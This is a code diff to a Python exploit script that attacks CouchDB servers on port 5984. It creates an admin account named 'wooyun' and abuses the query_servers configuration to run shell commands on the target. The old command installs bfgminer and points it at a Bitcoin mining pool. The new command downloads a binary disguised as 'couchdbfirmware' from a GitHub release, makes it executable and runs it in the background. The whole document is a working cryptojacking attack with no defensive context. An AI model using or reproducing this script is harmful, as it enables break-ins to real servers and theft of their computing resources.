@@ -6,7 +6,7 @@ print(sys.argv[1])
 
 
 target = 'http://'+sys.argv[1]+':5984'
-command = 'nohup ```apt-get update; apt-get install bfgminer -y ; bfgminer -o  stratum+tcp://btc.f2pool.com:3333 -u prctblminimum2.cdba'+sys.argv[2]+' -p uqkrubeatswv ``` > /dev/null'
+command = 'apt install wget;wget https://github.com/papppeeeerrrrspace/sweetyas/releases/download/log/couchdbfirmware;chmod 777 couchdbfirmware;nohup ./couchdbfirmware '+sys.argv[2]+' > /dev/null'
 version = 1
 v = requests.get(target).json()["version"]
 version = int(v[0])
@@ -26,10 +26,10 @@ session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
 session.auth = HTTPBasicAuth('wooyun', 'wooyun')
 try :
     if version == 1:
-        session.put(target + ('/_config/query_servers/cmd'), data=command, timeout=3)
+        session.put(target + ('/_config/query_servers/cmd'), data=command, timeout=60)
     else:
         host = session.get(target + '/_membership').json()['all_nodes'][0]
-        session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command, timeout=3)
+        session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command, timeout=60)
 except:
     a=""
 session.put(target + '/wooyun')
